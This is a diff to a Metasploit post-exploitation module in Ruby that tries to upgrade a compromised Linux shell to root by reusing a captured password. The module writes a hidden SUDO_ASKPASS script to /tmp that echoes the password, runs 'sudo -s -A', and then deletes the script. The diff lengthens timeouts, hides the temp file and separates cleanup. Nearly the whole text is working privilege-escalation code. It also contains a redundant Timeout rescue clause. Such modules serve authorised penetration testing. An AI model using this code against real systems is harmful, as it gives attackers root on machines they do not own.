@@ -25,7 +25,7 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Linux Sudo Shell',
+				'Name'          => 'Linux Post Sudo Upgrade Shell',
 				'Description'   => %q{
 					This module attempts to upgrade a shell account to UID 0 by reusing the
 					given password and passing it to sudo. This technique relies on sudo
@@ -48,7 +48,6 @@ class Metasploit3 < Msf::Post
 	def run
 		print_status("SUDO: Attempting to upgrade to UID 0 via sudo")
 		sudo_bin = cmd_exec("which sudo")
-		my_id = cmd_exec("id -u")
 		if is_root?
 			print_status "Already root, so no need to upgrade permissions. Aborting."
 			return
@@ -63,9 +62,9 @@ class Metasploit3 < Msf::Post
 	def get_root
 		password = session.exploit_datastore['PASSWORD']
 		if password.to_s.empty?
-			print_status "No password available, trying a passwordless sudo..."
+			print_status "No password available, trying a passwordless sudo."
 		else
-			print_status "Sudoing with password `#{password}'..."
+			print_status "Sudoing with password `#{password}'."
 		end
 		askpass_sudo(password)	
 		unless is_root?
@@ -91,25 +90,40 @@ class Metasploit3 < Msf::Post
 				print_error "SUDO: Passwordless sudo failed."
 			end
 		else
+			askpass_sh = "/tmp/." + Rex::Text.rand_text_alpha(7)
 			begin
-				::Timeout.timeout(30) do
-					askpass_sh = "/tmp/" + Rex::Text.rand_text_alpha(10) + "_ask"
-					vprint_status "Writing the askpass script: #{askpass_sh}"
+				# Telnet can be pretty pokey, allow about 20 seconds per cmd_exec
+				# Generally will be much snappier over ssh.
+				::Timeout.timeout(120) do
+					vprint_status "Writing the SUDO_ASKPASS script: #{askpass_sh}"
 					cmd_exec("echo '#!/bin/sh' > #{askpass_sh}")
 					cmd_exec("echo echo #{password} >> #{askpass_sh}")
+					vprint_status "Setting executable bit."
 					cmd_exec("chmod +x #{askpass_sh}")
 					vprint_status "Setting environment variable."
-					# Bruteforce-set the environment variable with both setenv and export.
-					askpass_env = cmd_exec("setenv SUDO_ASKPASS #{askpass_sh}") 
+					# Bruteforce the set command. At least one should work.
+					cmd_exec("setenv SUDO_ASKPASS #{askpass_sh}") 
 					cmd_exec("export SUDO_ASKPASS=#{askpass_sh}")
 					vprint_status "Executing sudo -s -A"
 					cmd_exec("sudo -s -A")
-					vprint_status "Deleting the askpass script."
-					cmd_exec("rm #{askpass_sh}")
 				end
 			rescue ::IOError, ::Timeout::Error
 				print_error "Sudo with a password failed."
+			rescue ::Timeout::Error
+				print_error "Timed out during sudo."
 			end
+			askpass_cleanup(askpass_sh)
+		end
+	end
+
+	def askpass_cleanup(askpass_sh)
+		begin
+			::Timeout.timeout(20) do
+				vprint_status "Deleting the SUDO_ASKPASS script."
+				cmd_exec("rm #{askpass_sh}")
+			end
+		rescue ::Timeout::Error
+			print_error "Timed out during sudo cleanup."
 		end
 	end
 
